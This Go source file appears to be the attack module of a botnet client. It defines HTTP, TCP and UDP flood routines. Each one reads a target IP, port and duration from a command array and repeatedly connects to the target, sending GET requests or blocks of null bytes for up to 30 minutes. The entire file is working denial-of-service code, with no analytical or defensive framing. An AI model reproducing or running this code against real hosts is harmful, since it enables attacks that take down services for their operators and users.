package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

func ddosHttpProc(ip string, port string) {
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		fmt.Println("Error http target")
		return
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(1 * time.Second))

	_, err = fmt.Fprintf(conn, "GET / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"User-Agent: Mozilla/5.0\r\n"+
		"Connection: keep-alive\r\n\r\n",
		ip)
	if err != nil {
		fmt.Println("Error writing to ddos target ", ip)
		return
	}
}

func ddosHttp(cmdbits []string) {
	cmd_ip := cmdbits[2]

	cmd_port := cmdbits[3]

	cmd_duration, err := strconv.Atoi(cmdbits[4])
	if err != nil {
		return
	}
	if cmd_duration > 1800 {
		cmd_duration = 1800
	}

	time_start := time.Now()
	time_end := time.Now().Add(time.Duration(cmd_duration) * time.Second)

	for inTimeSpan(time_start, time_end, time.Now()) {
		ddosHttpProc(cmd_ip, cmd_port)
	}
}

func ddosTcpProc(ip string, port string) {
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		fmt.Println("Error dialing tcp target", ip+":"+port)
		return
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(1 * time.Second))

	_, err = fmt.Fprintf(conn, strings.Repeat("\x00", 512))
	if err != nil {
		fmt.Println("Error writing to ddos target ", ip)
		return
	}
}

func ddosTcp(cmdbits []string) {
	cmd_ip := cmdbits[2]

	cmd_port := cmdbits[3]

	cmd_duration, err := strconv.Atoi(cmdbits[4])
	if err != nil {
		return
	}
	if cmd_duration > 1800 {
		cmd_duration = 1800
	}

	time_start := time.Now()
	time_end := time.Now().Add(time.Duration(cmd_duration) * time.Second)

	for inTimeSpan(time_start, time_end, time.Now()) {
		ddosTcpProc(cmd_ip, cmd_port)
	}
}

func ddosUdpProc(ip string, port string) {
	conn, err := net.Dial("udp", ip+":"+port)
	if err != nil {
		fmt.Println("Error dialing udp target")
		return
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(1 * time.Second))

	_, err = fmt.Fprintf(conn, strings.Repeat("\x00", 512))
	if err != nil {
		fmt.Println("Error writing to ddos target ", ip)
		return
	}
}

func ddosUdp(cmdbits []string) {
	cmd_ip := cmdbits[2]

	cmd_port := cmdbits[3]

	cmd_duration, err := strconv.Atoi(cmdbits[4])
	if err != nil {
		return
	}
	if cmd_duration > 1800 {
		cmd_duration = 1800
	}

	time_start := time.Now()
	time_end := time.Now().Add(time.Duration(cmd_duration) * time.Second)

	for inTimeSpan(time_start, time_end, time.Now()) {
		ddosUdpProc(cmd_ip, cmd_port)
	}
}
